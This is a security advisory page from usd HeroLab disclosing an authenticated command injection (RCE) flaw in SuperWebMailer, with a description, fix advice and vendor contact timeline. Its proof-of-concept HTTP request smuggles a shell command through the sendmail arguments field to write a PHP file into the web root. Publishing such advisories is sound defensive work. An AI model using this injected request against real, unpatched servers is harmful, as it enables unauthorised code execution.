
[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2023-0015/ "Deutsch")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/en/)

* [About Us](https://herolab.usd.de/en/about-us/)
  + [The Way We Work](https://herolab.usd.de/en/the-way-we-work/)
  + [Our Experts](https://herolab.usd.de/en/our-experts/)
  + [Our Services](https://www.usd.de/en/security-analysis-pentests/)
  + [Our Platforms and Tools](https://herolab.usd.de/en/our-platforms-and-tools/)
* [Security Research](https://herolab.usd.de/en/security-research/)
  + [Our Commitment](/en/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/en/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/en/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/en/labnews/)
* [Meet the Team](https://herolab.usd.de/en/meet-the-team/)
* [usd AG](https://www.usd.de/en/)
* [Deutsch](https://herolab.usd.de/security-advisories/usd-2023-0015/ "Deutsch")

# usd-2023-0015 | RCE in SuperWebMailer

#

**Advisory ID**: usd-2023-0015
**Product**: SuperWebMailer
**Affected Version**: 9.00.0.01710
**Vulnerability Type**: CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
**Security Risk**: CRITICAL
**Vendor URL**: https://www.superwebmailer.de
**Vendor acknowledged vulnerability**: No
**Vendor Status**: Not fixed
**CVE number**: CVE-2023-38193
**CVE Link**: Pending

### Desciption

SuperWebMailer is an online application for managing e-mail newsletters. An authenticated command injection vulnerability was discovered during an engagement. In a command injection attack, an attacker provides a malicious input which is passed by the application to the system and then executed.

The application allows to configure different methods to send outgoing e-mail. One of the available options is to configure sendmail. The user interface provides inputs for the path and the arguments to the sendmail binary. These inputs are accepted from the user without any encoding or filtering being applied. Consequently, an attacker may provide inputs that alter the intended effects of the sendmail command.

### Proof of Concept

First, login with a user with the privileges to create or modify "Versandvarianten". A new "Versandvariante" can be created by navigating to "Einstellungen -> Versandvarianten -> Neue Versandvariante anlegen". The following screenshot shows a possible malicious payload that creates a php file in a user-readable location.
![Screenshot of the RCE payload](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/rce_mta-01-payload.png)

The corresponding request is:

```
POST /mtaedit.php HTTP/2Host: swm.example.comCookie: PHPSESSID=8k8n7rmlnugo73d3jjtaeantft; SuperWebMailer=161kd4lr0kv8qplkknm927u0cs; smlswmCsrfToken=20mqIe2UqIA2ya6ImiqaYM2Q6EuYy6y6ya2QUa; ckCsrfToken=owDltMAWfNyS6UeMRck4tE3kPhfh4qaTr6QkSLAQUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 556smlswmCsrfToken=20mqIe2UqIA2ya6ImiqaYM2Q6EuYy6y6ya2QUa&MTAId=3&Name=sendmail+test&Type=sendmail&MailLimit=0&MTASenderEMailAddress=&sendmail_path=%2Fusr%2Fsbin%2Fsendmail&sendmail_args=-i%3B+echo+%27PD9waHAgcGhwaW5mbygpOyA%2FPg%3D%3D%27+%7C+base64+-d+-+%7C+tee+%2Fvar%2Fwww%2Fhtml%2Fuserfiles%2F2%2Ftest-phpinfo.php%3B+cat&savetodir_pathname=&SleepInMailSendingLoop=0&SMIMEMessageAsPlainText=1&SMIMESignCert=&SMIMESignPrivKey=&SMIMESignPrivKeyPassword=&SMIMESignExtraCerts=&DKIMSelector=&DKIMPrivKey=&DKIMPrivKeyPassword=&SubmitBtn=%C3%84nderungen+speichern
```

The payload may be triggered by testing the newly created Versandvariante via the overview screen.
![Screenshot of testing the Versandvariante to trigger the payload](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/rce_mta-02-trigger.png)

The created file is accessible under the path specified in the payload.
![Screenshot showing the execution of the created file](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/rce_mta-03-execution.png)

### Fix

It is recommended that all input to an application is seen as potentially dangerous and thus filter input on the server-side.
Where possible, an allowlist should be used for filtering.
Additionally, it is recommended to utilize a programming language's APIs instead of directly issuing system or shell commands.
Generally, all services should run with minimal required system privileges and users should have minimal required application privileges (least privilege).

### References

https://cwe.mitre.org/data/definitions/77.html
https://owasp.org/www-community/attacks/Command\_Injection

### Timeline

* **2022-09-26**: This vulnerability was discovered by Florian Dewald and Gerbert Roitburd of usd AG.
* **2023-04-20**: First contact request via info@superwebmailer.de.
* **2023-05-08**: Reminder sent via info@superwebmailer.de and contact form.
* **2023-05-15**: Second reminder to webmaster@wt-rate.com and info@superwebmailer.de.
* **2023-05-25**: Another reminder sent to info@superwebmailer.de, webmaster@wt-rate.com and info@wt-rate.com
* **2023-06-05**: Once more tried to inform the company of the vulnerabilities via the feedback form (info@superwebmailer.de).
* **2023-07-17**: Sent another email to info@supermailer.de, webmaster@wt-rate.com, info@wt-rate.com and info@superwebmailer.de, stressing that CVEs are assigned to the vulnerabilities and disclosure may happen in case we do not receive an answer soon.
* **2023-08-17**: As the vulnerabilities were found during a pentest, the customer was asked whether or not the Responsible Disclosure Team should move forward without the software vendor's cooperation.
* **2023-10-02**: Final notice given to info@superwebmailer, warning of immenent disclosure should there be no response within a week.
* **2023-10-20**: Vulnerabilities disclosed by usd AG.

### Credits

This security vulnerability was identified by Florian Dewald and Gerbert Roitburd of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

#### [Contact](https://www.usd.de/en/contact/)

[Imprint](https://www.usd.de/en/imprint/)

[Privacy Protection](https://www.usd.de/en/privacy-protection/)

[General Terms and Conditions](https://www.usd.de/en/terms-conditions/)

© 2025 usd AG

#### Follow Us

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)     [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/showcase/usd-ag-international/)

[Report a vulnerability or bug](https://www.usd.de/en/report-a-vulnerability-or-bug/)

[Code of Ethics](/en/code-of-ethics/)

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/en/the-security-risks-of-overlong-utf-8-encodings/)

Sep 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories on hugocms and Gitea](https://herolab.usd.de/en/security-advisories-on-hugocms-and-gitea/)

Jul 25, 2024

The pentest professionals at usd HeroLab examined hugocms and Gitea during their pentests. Thereby, several vulnerabilities were identified. The vulnerabilities were reported to the vendors as part of the Responsible Disclosure Policy. The usd HeroLab Advisories can...

## [Security Advisory on AXIS Webcam](https://herolab.usd.de/en/security-advisory-on-axis-webcam/)

Jul 1, 2024

The pentest professionals at usd HeroLab examined the AXIS Webcam (P1364) during their pentests. Our professionals discovered a vulnerability (cross-site request forgery) in the admin panel of AXIS P1364 Webcam. Exploiting this vulnerability enables an attacker to...

